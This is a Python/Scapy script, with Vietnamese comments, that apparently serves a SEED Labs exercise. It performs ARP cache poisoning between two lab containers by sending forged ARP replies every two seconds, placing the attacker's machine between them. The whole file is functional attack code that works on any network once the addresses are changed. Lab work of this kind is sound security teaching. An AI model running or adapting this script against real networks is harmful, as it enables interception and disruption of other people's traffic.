
from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr
import time

# Dia chi IP cac container trong SEED Labs
IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

INTERFACE = "eth0"

# Lay dia chi MAC thuc te
MAC_A = getmacbyip(IP_A)
MAC_B = getmacbyip(IP_B)
MAC_M = get_if_hwaddr(INTERFACE)

if MAC_A is None or MAC_B is None:
    raise RuntimeError("Khong tim thay MAC cua Host A hoac B")

print("MAC Host A:", MAC_A)
print("MAC Host B:", MAC_B)
print("MAC Host M:", MAC_M)

def poison(target_ip, target_mac, spoof_ip):
    packet = (
        Ether(src=MAC_M, dst=target_mac)
        / ARP(
            op=2,
            psrc=spoof_ip,
            hwsrc=MAC_M,
            pdst=target_ip,
            hwdst=target_mac
        )
    )
    sendp(packet, iface=INTERFACE, verbose=False)

print("Bat dau ARP Poisoning trong mang SEED Lab...")

try:
    while True:
        # Lam A tin rang IP cua B co MAC cua M
        poison(IP_A, MAC_A, IP_B)

        # Lam B tin rang IP cua A co MAC cua M
        poison(IP_B, MAC_B, IP_A)

        time.sleep(2)

except KeyboardInterrupt:
    print("\nDa dung gui goi ARP gia mao.")
